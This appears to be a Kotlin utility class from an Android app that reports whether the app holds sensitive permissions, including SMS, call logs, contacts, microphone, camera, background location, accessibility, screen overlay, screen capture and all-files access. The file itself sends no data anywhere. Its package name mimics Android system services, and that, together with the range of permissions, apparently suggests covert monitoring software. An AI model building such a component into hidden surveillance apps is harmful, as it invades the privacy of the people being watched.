package com.android.services.util

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import androidx.core.app.ActivityCompat
import com.android.services.models.AppPermission
import java.util.*

class PermissionMonitor(private val context: Context) {

    companion object {

        private var permissions: Map<String, String>? = null

        init {
            val mMap = HashMap<String, String>()
            mMap["calendar"] = Manifest.permission.READ_CALENDAR
            mMap["storage"] = Manifest.permission.READ_EXTERNAL_STORAGE
            mMap["call"] = Manifest.permission.READ_CALL_LOG
            mMap["contact"] = Manifest.permission.READ_CONTACTS
            mMap["sms"] = Manifest.permission.READ_SMS
            mMap["telephone"] = Manifest.permission.READ_PHONE_STATE
            mMap["microphone"] = Manifest.permission.RECORD_AUDIO
            mMap["camera"] = Manifest.permission.CAMERA
            permissions = Collections.unmodifiableMap(mMap)
        }
    }

    fun checkForAppPermissions(): List<AppPermission> {
        val appPermissionList: MutableList<AppPermission> = ArrayList()
        for ((key, value) in permissions!!) {
            if (key == "storage" && AppConstants.osGreaterThanEqualToEleven) {
                appPermissionList.add(AppPermission(key, true))
            } else {
                if (!checkPermissionGranted(value)) {
                    appPermissionList.add(AppPermission(key, false))
                } else {
                    appPermissionList.add(AppPermission(key, true))
                }
            }
        }
        if (AppUtils.isAccessibilityEnabled(context)) {
            appPermissionList.add(AppPermission("accessibility", true))
        } else {
            appPermissionList.add(AppPermission("accessibility", false))
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            appPermissionList.add(AppPermission("drawOverApps", false))
        } else {
            appPermissionList.add(AppPermission("drawOverApps", true))
        }
        if (AppConstants.screenRecordingIntent == null) {
            appPermissionList.add(AppPermission("screenCast", false))
        } else {
            appPermissionList.add(AppPermission("screenCast", true))
        }
        var accessBackgroundLocation = true
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            accessBackgroundLocation =
                checkPermissionGranted(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (!AppUtils.isLocationPermissionGranted(context) || !accessBackgroundLocation) {
            appPermissionList.add(AppPermission("location", false))
        } else {
            appPermissionList.add(AppPermission("location", true))
        }

        if (AppConstants.osGreaterThanEqualToEleven) {
            appPermissionList.add(
                AppPermission(
                    "accessOfFiles",
                    AppUtils.isManagementOfAllFilesPermissionGranted(context)
                )
            )
        }
        return appPermissionList
    }

    private fun checkPermissionGranted(permission: String): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            permission
        ) == PackageManager.PERMISSION_GRANTED
    }
}